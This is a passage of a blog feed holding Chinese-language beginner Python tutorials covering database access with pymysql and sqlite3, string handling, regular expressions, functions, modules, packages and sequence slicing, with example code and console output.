args):执行多个数据库查询或命令<br>fetchone():获取查询结果集的下一条记录<br>fetchmany([size = cursor.arraysize]):获取指定数量的记录<br>fetchall():获取结果集的所有记录<br>nextset():跳至下一个可用结果集</p></blockquote><p><img src="http://img-blog.csdnimg.cn/20200120234613472.png" alt="在这里插入图片描述"></p><pre><code class="python">#获取Connection对象conn = pymysql.connect(host=&#39;localhost&#39;,                       user=&#39;user&#39;,                       password=&#39;passwd&#39;,                       db=&#39;test&#39;,                       charset=&#39;utf-8&#39;                       cursorclass=pymysql.cursors.DictCursor)#生成Cursor对象cur = conn.cursor()#执行SQL语句cur.excute(&quot;insert into users(id,name) values(1,&#39;qwzf&#39;)&quot;)#关闭Cursor对象cur.close()#提交当前事务conn.commit()#关闭Connection对象conn.close()</code></pre><h4 id="2、使用SQLite"><a href="#2、使用SQLite" class="headerlink" title="2、使用SQLite"></a>2、使用SQLite</h4><p>Python内置SQLite模块：<code>sqlite3</code><br>连接数据库-&gt;执行SQL语句-&gt;关闭连接<br><strong>1.创建数据库文件</strong><br>实现步骤：<br>导入sqlite3模块-&gt;创建Connection对象-&gt;创建Cursor对象-&gt;执行SQL语句-&gt;关闭游标-&gt;关闭连接</p><pre><code class="python">#导入模块import sqlite3#创建连接对象conn = sqlite3.connect(&#39;qwzf.db&#39;)#创建游标对象cursor = conn.cursor()#执行SQL语句cursor.execute(&#39;create table user(id int(10) primary key,name varchar(20))&#39;)#关闭游标cursor.close()#关闭连接conn.close()</code></pre><p><strong>2.操作SQLite数据库</strong><br>即增删改查，参考：<a href="https://blog.csdn.net/qq_15181569/article/details/93875756" target="_blank" rel="noopener">python 操作SQLite3数据库的方法</a></p><h4 id="3、使用PyMySQL"><a href="#3、使用PyMySQL" class="headerlink" title="3、使用PyMySQL"></a>3、使用PyMySQL</h4><p> PyMySQL 是在 Python3.x 版本中用于连接 MySQL 服务器的一个库<br><strong>1.下载安装MySQL</strong><br>可以直接使用内置MySQL的集成软件，如：phpstudy<br><strong>2.安装PyMySQL</strong></p><pre><code class="shell">pip install PyMySQL</code></pre><p>测试是否安装成功</p><pre><code class="python">&gt;&gt;&gt; import pymysql</code></pre><p><strong>3.连接数据库</strong></p><pre><code class="python">#导入PyMySQL模块import pymysql#调用connect()函数产生Connection连接对象db = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;,&#39;testpy&#39;,&#39;utf8&#39;)#db = pymysql.connect(host = &#39;localhost&#39;,user = &#39;root&#39;,password = &#39;root&#39;,database = &#39;testpy&#39;,charset = &#39;utf8&#39;)#调用cursor()方法，创建Cursor对象cursor = db.cursor()#执行SQL语句cursor.execute(&#39;select version()&#39;)data = cursor.fetchone()print(data)#关闭游标和连接cursor.close()db.close()</code></pre><p><img src="http://img-blog.csdnimg.cn/20200121005817200.jpg" alt="在这里插入图片描述"><br><strong>4.操作MySQL数据库</strong><br>即增删改查，参考：<a href="https://www.cnblogs.com/hanmk/p/9215387.html" target="_blank" rel="noopener">使用pymysql操作数据库</a>、<a href="https://blog.csdn.net/linshijun33/article/details/88677305" target="_blank" rel="noopener">pymysql数据库之建库建表、增删改查</a></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>到现在为止Python基础知识已经基本学完了(这里表示还没学Python的面向对象程序设计和GUI界面编程)。在这些Python的基础知识上，可以开始愉快的开启Python进阶之旅了@_@！！！</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异常处理及程序调试 </tag>
            
            <tag> 文件及目录操作 </tag>
            
            <tag> 操作数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习-基础篇(三)</title>
      <link href="/2020/01/19/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%89)/"/>
      <url>/2020/01/19/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于我现在暂时用不到面向对象程序设计，所以暂且先不学习Python的面向对象程序设计。<br>本篇包含：<strong>字符串及正则表达式、函数、模块</strong></p><h3 id="五、字符串及正则表达式"><a href="#五、字符串及正则表达式" class="headerlink" title="五、字符串及正则表达式"></a>五、字符串及正则表达式</h3><h4 id="1、字符串"><a href="#1、字符串" class="headerlink" title="1、字符串"></a>1、字符串</h4><h4 id="1-字符串常用操作"><a href="#1-字符串常用操作" class="headerlink" title="1.字符串常用操作"></a>1.字符串常用操作</h4><p><strong>（1）拼接字符串</strong></p><pre><code class="python">字符串1+字符串2 = 字符串1 字符串2</code></pre><p>字符串不可以直接和数值类型相加<br><strong>（2）计算字符串的长度</strong><br>字符串的长度，即字符串所占字节数。<br><code>A-Z</code>、<code>a-z</code>、<code>0-9</code>、<code>._空格</code>等占一个字节<br>中文汉字占2~4字节：UTF-8占3个；GBK(gb2312)占2个<br>1）计算字符串字符的个数</p><pre><code class="python">len(string)#len()函数获取字符的个数，不管中文还是英文都按一个字符计算</code></pre><p>2）计算字符串所占字节数</p><pre><code class="python">len(string.encode()) #计算UTF-8编码字符长度len(string.encode(&quot;gbk&quot;)) #计算GBK编码字符长度</code></pre><p><strong>（3）截取字符串</strong><br>字符串属于序列。所以：<br>1）获取字符可以使用索引</p><pre><code class="python">string[索引值]</code></pre><p>2）截取字符串可以使用切片</p><pre><code class="python">string[start:end:step]</code></pre><p><strong>（4）分割、合并字符串</strong><br>1）分割字符串：<code>split()</code></p><pre><code class="python">listname = str.split(sep,maxsplit)#sep指定分隔符，默认值是空白符，如：空格、\n、\t。#maxsplit分隔次数，-1表示没有限制</code></pre><pre><code class="python">&gt;&gt;&gt; str1 = &quot;你  有 多 自信,\n世界 就有 多 相信你&quot;&gt;&gt;&gt; str1.split()[&#39;你&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,&#39;, &#39;世界&#39;, &#39;就有&#39;, &#39;多&#39;, &#39;相信你&#39;]&gt;&gt;&gt; str1.split(&quot; &quot;)[&#39;你&#39;, &#39;&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,\n世界&#39;, &#39;就有&#39;, &#39;多&#39;, &#39;相信你&#39;]&gt;&gt;&gt; str1.split(&quot; &quot;,5)[&#39;你&#39;, &#39;&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,\n世界&#39;, &#39;就有 多 相信你&#39;]&gt;&gt;&gt; str1.split(&quot;\n&quot;)[&#39;你  有 多 自信,&#39;, &#39;世界 就有 多 相信你&#39;]</code></pre><pre><code class="python">str1 = &quot;@lemon @qwzf @未完成的歌 @chumen007&quot;list1 = str1.split(&#39; &#39;) #用空格分隔字符串for item in list1:    print(item[1:]) #输出好友，并去掉@</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118220844294.jpg" alt="在这里插入图片描述"><br>2）合并字符串：<code>join()</code></p><pre><code class="python">strnew = string.join(iterable)#string合并时的分隔符#iterable可迭代对象</code></pre><pre><code class="python">list1 = [&quot;lemon&quot;,&quot;qwzf&quot;,&quot;未完成的歌&quot;,&quot;chumen007&quot;] #好友列表str1 = &quot; @&quot;.join(list1) #用空格和@连接str2 = &quot;@&quot; + str1print(&quot;你要@的好友:&quot;,str2)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118221640920.jpg" alt="在这里插入图片描述"><br><strong>（5）检索字符串</strong><br>检索一个字符串在另一个字符串出现的次数：<code>count()</code><br>检索是否包含子字符串：<code>find()</code>、<code>index()</code>、<code>in关键字</code><br>检索是否以指定字符串开头和结尾：<code>startswith()</code>、<code>endswith()</code></p><pre><code class="python">str.count(sub[,start[,end]])#sub指定要检索的子字符串#start指定检索的起始位置#end指定检索的结束位置str.find(sub[,start[,end]])#找到返回首次检索到子字符串的索引值；没找到返回-1#find从左往右找，rfind从右往左找str.index(sub[,start[,end]])#找到返回首次检索到子字符串的索引值；没找到返回异常#index从左往右找，rindex从右往左找str.startswith(prefix[,start[,end]])str.endswith(prefix[,start[,end]])#prefix指定要检索的字符串#是，返回True；否，返回False</code></pre><p><strong>（6）字母的大小写转换</strong><br>1）大写转小写：<code>str.lower()</code><br>2）小写转大写：<code>str.upper()</code><br><strong>（7）去除字符串中的空格和特殊字符</strong><br>特殊字符：<code>\t</code>、<code>\r</code>、<code>\n</code><br>去除字符串左右两端的空格和特殊字符：<code>str.strip([chars])</code><br>去除字符串左侧和右侧的空格和特殊字符：<code>str.lstrip([chars])</code>、<code>str.rstrip([chars])</code><br><strong>（8）格式化字符串</strong><br>1）使用<code>%</code>操作符</p><pre><code class="python">&#39;%[-][+][0][m][.n]格式化字符&#39;%exp#[-]表示左对齐，正数前没有符号；负数的前加上负号#[+]表示右对齐，正数前加上正号；负数的前加上负号#[0]表示右对齐，正数前没有符号；负数的前有负号，填充空白处，一般和[m]一起使用#[m]数值所占宽度#[0][m]不够宽度前补0#[.n]小数点后保留n位数#格式化字符 格式化成字符串s 格式化成十进制整数d 格式化成浮点数f#exp要转换的项</code></pre><pre><code class="python">&gt;&gt;&gt; template = &#39;编号:%09d\t 公司名称:%s\t 官网:http://www.%s.com&#39; #定义模板&gt;&gt;&gt; item = (6,&quot;百度&quot;,&quot;baidu&quot;) #要转换内容&gt;&gt;&gt; print(template%item)编号:000000006     公司名称:百度     官网:http://www.baidu.com</code></pre><p>2）使用字符串对象的<code>format()</code>方法(推荐)</p><pre><code class="python">str.format(args)#str模板#{[index][:[[fill]align][sign][#][width][.precision][type]}#index设置索引位置#fill指定空白处填充字符#align对齐方式:&lt;内容左对齐；&gt;右对齐；=内容左对齐,符号放填充内容的最右侧；^内容居中#sign指定有无符号数##指定2、8、16进制是否加前缀#width指定所占宽度#.precision指定保留小数位数#type要格式化字符的类型：s、d、f#args要转换的项</code></pre><pre><code class="python">&gt;&gt;&gt; template = &#39;编号:{:0&gt;9d}\t 公司名称:{:s}\t 官网:http://www.{:s}.com&#39; #定义模板&gt;&gt;&gt; print(template.format(7,&quot;百度&quot;,&quot;baidu&quot;))编号:000000007     公司名称:百度     官网:http://www.baidu.com</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011823332098.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2020011823335952.jpg" alt="在这里插入图片描述"></p><p><strong>（9）String模块中的常量：</strong><br>string.digits：数字0~9<br>string.ascii_letters：所有字母（大小写）<br>string.lowercase：所有小写字母<br>string.printable：可打印字符的字符串<br>string.punctuation：所有标点<br>string.uppercase：所有大写字母</p><h4 id="2-字符串编码转换"><a href="#2-字符串编码转换" class="headerlink" title="2.字符串编码转换"></a>2.字符串编码转换</h4><p>ASCII、GBK/GB2312、UTF-8<br>str：Unicode字符 如：”拼搏到感动自己”<br>bytes：二进制数据 如：b’\xd2\xb0’和b’mr’<br><strong>（1）使用encode()方法编码</strong><br>将字符串转换成二进制数据，即str-&gt;bytes</p><pre><code class="python">str.encode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;])#strict遇到非法参数抛出异常#ignore忽略非法字符#replace用?替换非法字符#xmlcharrefreplace使用xml的字符引用</code></pre><p><strong>（2）使用decode()方法解码</strong><br>bytes-&gt;str</p><pre><code class="python">str.decode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;])</code></pre><pre><code class="python">str1 = &quot;拼搏到感动自己&quot;byte1 = str1.encode(&quot;GBK&quot;)byte2 = str1.encode(&quot;utf-8&quot;)str01 = byte1.decode(&quot;GBK&quot;)str02 = byte2.decode(&quot;utf-8&quot;)print(&quot;原字符串：&quot;,str1)print(&quot;GBK编码：&quot;,byte1)print(&quot;UTF-8编码：&quot;,byte2)print(&quot;GBK解码：&quot;,str01)print(&quot;UTF-8解码：&quot;,str02)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118235403307.jpg" alt="在这里插入图片描述"></p><h4 id="2、正则表达式"><a href="#2、正则表达式" class="headerlink" title="2、正则表达式"></a>2、正则表达式</h4><h5 id="1-正则表达式"><a href="#1-正则表达式" class="headerlink" title="1.正则表达式"></a>1.正则表达式</h5><p>（1）行定位符<br><code>^</code>表示开始<br><code>$</code>表示结束<br>（2）元字符<br>常用的除<code>^</code>、<code>$</code>外，还有：<br><img src="http://img-blog.csdnimg.cn/20200119001520306.png" alt="在这里插入图片描述"><br>（3）限定符<br><img src="http://img-blog.csdnimg.cn/20200119001533704.png" alt="在这里插入图片描述"><br>（4）字符类<code>[]</code><br>如：匹配元音字母[aeiou]、匹配汉字[\u4e00-\u9fa5]<br>（5）排除字符<code>^</code><br><code>^</code>放到<code>[]</code>中表示排除，如<code>[^a-zA-Z]</code><br>（6）选择字符<code>|</code><br>如：<code>[a-z]|[0-9]</code>匹配a-z或0-9<br>（7）转义字符<code>\</code><br>（8）分组<code>()</code><br>如：<code>(\.[0-9]{1,3}){3}</code>对分组匹配3次<br><strong>补充</strong>：原生字符串，如：<code>&#39;\\bm\\w*\\b&#39;</code>写成原生字符串<code>r&#39;\bm\w*\b&#39;</code></p><h5 id="2-使用re模块实现正则表达式操作"><a href="#2-使用re模块实现正则表达式操作" class="headerlink" title="2.使用re模块实现正则表达式操作"></a>2.使用re模块实现正则表达式操作</h5><p><strong>（1）匹配字符串</strong><br>1）<code>re.match</code> 只是从头开始匹配</p><pre><code class="python">re.match(pattern,string,[flags])#pattern模式字符串#string要进行匹配的字符串#flags指定标志位#标志位控制匹配方式：re.I:不区分字母大小写，re.A:让\w不匹配汉字</code></pre><pre><code class="python">import repattern = r&#39;qw_\w*&#39; #模式字符串string = &#39;QW_PYTHON qw_python&#39; #要匹配的字符串match = re.match(pattern,string,re.I) #匹配字符串print(match)print(&quot;起始位置：&quot;,match.start())print(&quot;结束位置：&quot;,match.end())print(&quot;匹配数据：&quot;,match.group())</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119003427517.jpg" alt="在这里插入图片描述"><br>2）<code>re.search</code> 匹配包含</p><pre><code class="python">re.search(pattern,string,[flags])</code></pre><pre><code class="python">import repattern = r&#39;qw_\w*&#39; #模式字符串string = &#39;项目QW_PYTHON qw_python&#39; #要匹配的字符串match = re.search(pattern,string,re.I) #匹配字符串print(match)print(&quot;起始位置：&quot;,match.start())print(&quot;结束位置：&quot;,match.end())print(&quot;匹配数据：&quot;,match.group())</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119003913823.jpg" alt="在这里插入图片描述"><br>3）<code>re.findall</code> 把所有匹配到的字符放到以列表中的元素返回</p><pre><code class="python">re.findall(pattern,string,[flags])</code></pre><pre><code class="python">import repattern = r&#39;qw_\w*&#39; #模式字符串string = &#39;项目QW_PYTHON qw_python&#39; #要匹配的字符串match = re.findall(pattern,string,re.I) #匹配字符串print(&quot;匹配到字符串列表：&quot;,match)print(&quot;匹配到的字符串：&quot;)for item in match:    print(item)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119004343539.jpg" alt="在这里插入图片描述"><br><strong>（2）替换字符串</strong><br><code>re.sub</code> 匹配字符并替换</p><pre><code class="python">re.sub(pattern,repl,string,count,flags)#repl用来进行替换的字符串#count替换的最大次数，默认值0替换所有</code></pre><pre><code class="python">import repattern = r&#39;1[3-8]\d{9}&#39; #模式字符串string = &#39;中奖号码：888999 联系电话：13866666611&#39; #要匹配的字符串result = re.sub(pattern,&quot;1xxxxxxxxxx&quot;,string) #替换字符串print(result)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119005823531.jpg" alt="在这里插入图片描述"><br><strong>（3）分割字符串</strong><br><code>re.split</code> 以匹配到的字符当做列表分隔符</p><pre><code class="python">re.split(pattern,string,[maxsplit],[flags])#maxsplit最大拆分次数</code></pre><pre><code class="python">import repattern = r&#39;[?|&amp;]&#39; #分隔符string = &quot;http://www.xxx.com/login.php?user=&#39;qwzf&#39;&amp;pwd=&#39;qwzf&#39;&quot; #要匹配的字符串result = re.split(pattern,string) #分割字符串print(result)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119010901105.jpg" alt="在这里插入图片描述"><br><strong>补充</strong>：<code>re.fullmatch</code> 全部匹配</p><h3 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h3><h4 id="1、函数的创建和调用"><a href="#1、函数的创建和调用" class="headerlink" title="1、函数的创建和调用"></a>1、函数的创建和调用</h4><pre><code class="python">#创建函数def functionname([参数]):    &#39;&#39;&#39;函数说明&#39;&#39;&#39;    函数体#调用函数functionname([参数])</code></pre><h4 id="2、参数传递"><a href="#2、参数传递" class="headerlink" title="2、参数传递"></a>2、参数传递</h4><p><strong>1.了解形式参数和实际参数</strong><br>值传递和引用传递<br>值传递-&gt;不可变对象-&gt;不改变形式参数的值<br>引用传递-&gt;可变对象-&gt;改变形式参数的值<br><img src="http://img-blog.csdnimg.cn/20200119013109652.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200119013116216.jpg" alt="在这里插入图片描述"><br><strong>2.位置参数</strong><br>位置参数是必须按照定义时的个数和顺序进行参数传递，也称必备参数。<br><strong>3.关键字参数</strong><br>关键字参数是指使用形式参数的名字来确定输入的参数值。</p><pre><code class="python">def functionname(p1,p2,p3):    函数体functionname(p1=v1,p2=v2,p3=v3)functionname(p1=v1,p3=v3,p2=v2)</code></pre><p><strong>4.为参数设置默认值</strong></p><pre><code class="python">def functionname(...,[参数名=默认值]):    函数体#默认值参数必须放在所有参数的最后如：def functionname(p2,p3,p1=v1):    函数体#查看默认值print(functionname,__defaults__)</code></pre><p>为参数设置默认值时，参数必须指向不可变对象。遇到可变对象，参数默认值可以设置为None。<br><strong>5.可变参数</strong><br>个数不固定的参数-&gt;0、1、2…n个参数<br>（1）<code>*parameter</code><br>接收任意多个实参，并把它们放到元组中<br>也可接收列表</p><pre><code class="python">def coffee(*name):    print(&quot;\n咖啡有：&quot;)    for item in name:        print(item) #输出咖啡名称coffee(&quot;卡布奇诺&quot;,&quot;蓝山&quot;,&quot;拿铁&quot;)list1 = [&quot;卡布奇诺&quot;,&quot;蓝山&quot;,&quot;拿铁&quot;]coffee(*list1)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119020141124.jpg" alt="在这里插入图片描述"><br>（2）<code>**parameter</code><br>接收任意多个类似关键字参数一样显式赋值的实参，并将其放到一个字典中<br>也可接收字典</p><pre><code class="python">def sign(**sign):    print()    for key,value in sign.items(): #遍历字典        print(key,&quot;的汉字是&quot;,value)sign(chi=&#39;吃&#39;,kan=&#39;看&#39;)dict1 = {&#39;zi&#39;:&#39;字&#39;,&#39;dian&#39;:&#39;典&#39;}sign(**dict1)</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011902142369.jpg" alt="在这里插入图片描述"></p><h4 id="3、返回值"><a href="#3、返回值" class="headerlink" title="3、返回值"></a>3、返回值</h4><pre><code class="python">return [value]#不指定return或没有value，返回None</code></pre><pre><code class="python">def functionname(p1,p2,p3):    函数体    return r1,r2......result = functionname(v1,v2,v3)#只有一个返回值result保存的是返回值#有多个返回值result保存的是元组</code></pre><h4 id="4、变量的作用域"><a href="#4、变量的作用域" class="headerlink" title="4、变量的作用域"></a>4、变量的作用域</h4><p>变量的作用域是指程序代码能够访问该变量的区域，如果超出该区域，再访问时就会出现错误。<br>根据变量有效范围：局部变量和全局变量<br>函数体内修改全局变量：<br>在函数体内定义一个全局变量，使用<code>global</code>关键字将局部变量变成全局变量</p><pre><code class="python">string = &quot;我学Python&quot;def demo():    global string #定义全局变量    string = &quot;我被修改了！&quot; #修改全局变量    print(&quot;函数内全局变量&quot;,string)demo()print(&quot;函数外全局变量&quot;,string)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119023658205.jpg" alt="在这里插入图片描述"></p><h4 id="5、匿名函数-lambda"><a href="#5、匿名函数-lambda" class="headerlink" title="5、匿名函数(lambda)"></a>5、匿名函数(lambda)</h4><p>Python中使用lambda表达式来实现匿名函数。</p><pre><code class="python">result = lambda [arg1[,arg2,...,argn]]:expression#arg1参数#expression实现具体功能的表达式，不能出现for或while等</code></pre><pre><code class="python">import mathr = 10 #半径result = lambda r:math.pi*r*rprint(&quot;半径为&quot;,r,&quot;的圆面积为:&quot;,result(r))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119025326534.jpg" alt="在这里插入图片描述"></p><h3 id="七、模块"><a href="#七、模块" class="headerlink" title="七、模块"></a>七、模块</h3><h4 id="1、模块概述"><a href="#1、模块概述" class="headerlink" title="1、模块概述"></a>1、模块概述</h4><p>模块是Python程序<br>模块-&gt;*.py<br>把能够实现某一特定功能的代码放置在一个文件中作为一个模块，从而方便其他程序和脚本导入并使用。<br>使用模块的四点好处：<br>（1）可以避免函数名和变量名冲突<br>（2）更容易查找代码<br>（3）提高代码的可重用性<br>（4）有选择的使用</p><h4 id="2、自定义模块"><a href="#2、自定义模块" class="headerlink" title="2、自定义模块"></a>2、自定义模块</h4><p>模块可包含：函数、变量、类、可执行代码<br><strong>1.创建模块</strong><br>模块名.py-&gt;文件名<br>模块名不能是Python自带的标准模块名称。</p><pre><code class="python">#calculate.pydef add(a,b): #加法    return round(a+b,1)</code></pre><pre><code class="python">#demo.pyimport calculate #导入模块x = 0.2y = 0.3print(calculate.add(x,y))</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011903214751.jpg" alt="在这里插入图片描述"><br><strong>2.使用import语句导入模块</strong></p><pre><code class="python">import modulename [as alias]#alias别名#使用as关键字为模块指定别名#指定别名之后，可以通过别名引用模块</code></pre><p>import语句导入模块-&gt;命名空间<br><strong>3.使用from…import语句导入模块</strong></p><pre><code class="python">from modulename import member#member变量、函数、类#导入模块全部定义，使用*#dir()函数打印模块的全部定义</code></pre><pre><code class="python">#calculate.pydef add(a,b): #加法    return round(a+b,1)def sub(a,b): #减法    return round(a-b,1)def mul(a,b): #乘法    return round(a*b,1)</code></pre><pre><code class="python">#demo.pyfrom calculate import add #导入模块中add()函数x = 0.2y = 0.3print(add(x,y))</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011903214751.jpg" alt="在这里插入图片描述"><br><strong>注</strong>：导入两个包括同名函数的模块，使用import语句导入。<br><strong>4.模块搜索目录</strong><br>导入模块时查找模块的顺序是：<br>1）先从内存中，已经存在的模块中查找<br>2）内置的模块<br>3）自定义模块<br>4）环境变量sys.path中找<br>（1）临时添加<br>临时目录只在当前执行的窗口有效</p><pre><code class="python">#F:\Python\temp\calculate.pydef add(a,b): #加法    return round(a+b,1)</code></pre><pre><code class="python">#F:\Python\demo\demo.pyimport sys       #导入内置模块sys.path.append(&#39;F:/Python/temp&#39;) #添加临时目录import calculate #导入自定义模块print(sys.path)x = 0.2y = 0.3print(calculate.add(x,y))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119160445859.jpg" alt="在这里插入图片描述"><br>（2）增加.pth文件(推荐)<br>只在当前Python版本有效<br><img src="http://img-blog.csdnimg.cn/20200119164450401.jpg" alt="在这里插入图片描述"></p><pre><code class="python">#F:\Python\demo\demo.pyimport sys       #导入内置模块import calculate #导入自定义模块print(sys.path)x = 0.2y = 0.3print(calculate.add(x,y))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119164557888.jpg" alt="在这里插入图片描述"><br>（3）在PYTHONPATH环境变量中添加<br>在多个Python版本有效<br><img src="http://img-blog.csdnimg.cn/20200119165331712.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200119165450396.jpg" alt="在这里插入图片描述"></p><h4 id="3、以主程序的形式执行"><a href="#3、以主程序的形式执行" class="headerlink" title="3、以主程序的形式执行"></a>3、以主程序的形式执行</h4><p>由于Python没有统一的程序入口，从第一行开始执行。会出现一些问题。解决方法：以主程序的形式执行</p><pre><code class="python">if __name__ == &#39;__main__&#39;#__name__记录模块名称的变量。#当程序在顶级模块运行时，返回的值就是__main__；被导入其他文件时，返回的值是模块名称</code></pre><pre><code class="python">#calculate.pystr1 = &quot;我学Python&quot;def string():    str2 = &quot;没有什么不可能&quot;    return str2print(&quot;__name__运行测试：&quot;,__name__)if __name__ == &#39;__main__&#39;:    print(&quot;以主程序的形式执行&quot;)    print(str1)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119172536170.jpg" alt="在这里插入图片描述"></p><pre><code class="python">#main.pyimport calculate #导入模块print(&quot;导入模块后输出:&quot;,calculate.str1)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119172607550.jpg" alt="在这里插入图片描述"></p><h4 id="4、Python中的包"><a href="#4、Python中的包" class="headerlink" title="4、Python中的包"></a>4、Python中的包</h4><p>包-&gt;文件夹-&gt;<code>__init__.py</code><br>规范代码<br>模块：避免函数名和变量名重名引发的冲突<br>包：避免模块名重名引发的冲突<br><strong>1.Python程序的包结构</strong><br>文件夹下包含<code>__init__.py</code>，则这个文件夹就是个包<br><strong>2.创建和使用包</strong><br>（1）创建包<br>1）创建文件夹<br>2）在文件夹下，创建<code>__init__.py</code><br>3）在文件夹下，创建模块<br>（2）使用包<br>1）import + 完整包名 + 模块名<br>如：</p><pre><code class="python">import settings.sizeprint(settings.size.width)</code></pre><p>2）from + 完整包名 + import + 模块名<br>如：</p><pre><code class="python">from settings import sizeprint(size.width)</code></pre><p>3）from + 完整包名 + .模块名 + import + 定义名<br>如：</p><pre><code class="python">from settings.size import widthprint(width)</code></pre><h4 id="5、引用其他模块"><a href="#5、引用其他模块" class="headerlink" title="5、引用其他模块"></a>5、引用其他模块</h4><p><strong>1.标准模块</strong><br>标准模块可查看官方说明文档：python37/Doc/python373.chm：The Python Standard Library<br>中文版参考：<a href="https://www.cnblogs.com/givemelove/p/9482486.html" target="_blank" rel="noopener">Python3.x标准模块库目录</a><br><strong>2.第三方模块的下载与安装</strong><br>（1）下载网站：</p><pre><code class="python">https://pypi.org/http://pypi.python.org/pypi</code></pre><p>（2）pip</p><pre><code class="python">pip &lt;command&gt; [modulename]#command包括：install、uninstall、list#install安装第三方模块#uninstall卸载第三方模块#list显示已经安装的第三方模块</code></pre><p>导入模块顺序：标准模块-&gt;第三方模块-&gt;自定义模块<br><em>常用pip命令：</em><br>1）不同Python版本使用pip：</p><pre><code class="python">python3 -m pip &lt;command&gt; [modulename]</code></pre><p>2）pip源临时更换到国内镜像：</p><pre><code class="python">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [modulename]</code></pre><p><a href="https://blog.csdn.net/sinat_21591675/article/details/82770360" target="_blank" rel="noopener">将pip源更换到国内镜像</a><br>（3）通过<code>setup.py</code>安装</p><pre><code class="python">打开cmd 到达安装目录python setup.py buildpython setup.py install</code></pre><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>学习完字符串及正则表达式、函数、模块后，掌握了字符串的操作、正则表达式模式串的编写、函数相关知识和模块的使用。继续学习@_@</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串及正则表达式 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习-基础篇(二)</title>
      <link href="/2020/01/18/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%BA%8C)/"/>
      <url>/2020/01/18/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇包含：<strong>序列的应用(列表、元组、字典、集合)</strong></p><h3 id="四、序列的应用"><a href="#四、序列的应用" class="headerlink" title="四、序列的应用"></a>四、序列的应用</h3><h4 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h4><p>序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，可以通过索引取值。<br><strong>1.索引</strong><br>索引-&gt;编号-&gt;下标<br>从0开始计数<br>索引可以是负数(从-1开始)</p><pre><code class="python">元素1 元素2 元素3 元素40      1     2    3-4    -3    -2   -1</code></pre><pre><code class="py">&gt;&gt;&gt; string = &quot;一言既出，驷马难追。&quot;&gt;&gt;&gt; print(string[1])言&gt;&gt;&gt; print(string[-2])追</code></pre><p><strong>2.切片(分片)</strong></p><pre><code class="py">sname[start : end : step]#sname：列表名称#start：起始值(包括)#end：结束值(不包括)#step：步长</code></pre><pre><code class="py">&gt;&gt;&gt; student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;]&gt;&gt;&gt; print(student[1:5])[&#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;]&gt;&gt;&gt; print(student[0:5:2])[&#39;小明&#39;, &#39;小赵&#39;, &#39;张张&#39;]&gt;&gt;&gt; print(student[5]) #只有end并省略:就变成了索引李华&gt;&gt;&gt; print(student[:5])[&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;]&gt;&gt;&gt; print(student[:])[&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;, &#39;李华&#39;, &#39;王强&#39;]&gt;&gt;&gt; print(student[5:])[&#39;李华&#39;, &#39;王强&#39;]</code></pre><p><strong>3.序列相加</strong><br><code>序列1+序列2=序列1 序列2</code><br>只能是同类型的<strong>序列</strong>相加，如：列表+列表、元组+元组、字符串+字符串</p><pre><code class="py">&gt;&gt;&gt; stu1 = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;]&gt;&gt;&gt; stu2 